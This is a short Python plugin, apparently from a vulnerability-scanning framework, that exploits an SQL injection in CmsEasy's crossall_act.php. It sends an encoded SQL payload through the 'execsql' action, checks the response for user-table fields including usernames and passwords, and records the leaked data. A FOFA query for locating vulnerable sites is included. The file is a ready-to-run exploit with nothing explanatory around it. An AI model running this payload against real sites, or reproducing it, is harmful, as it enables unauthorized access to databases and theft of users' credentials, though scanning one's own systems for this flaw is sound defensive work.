#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/cms/CmsEasy/CmsEasy crossall_act.php SQL注入漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'CmsEasy crossall_act.php SQL注入',

      'level'     :   'high',

      'FOFA'      :   'body="cmseasyedit"',

      'author'    :   'ppxfx',
      
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5'
  url1 = url + target
  # ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'userid.*?username.*?password.*?nickname.*?groupid.*?address.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url1
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret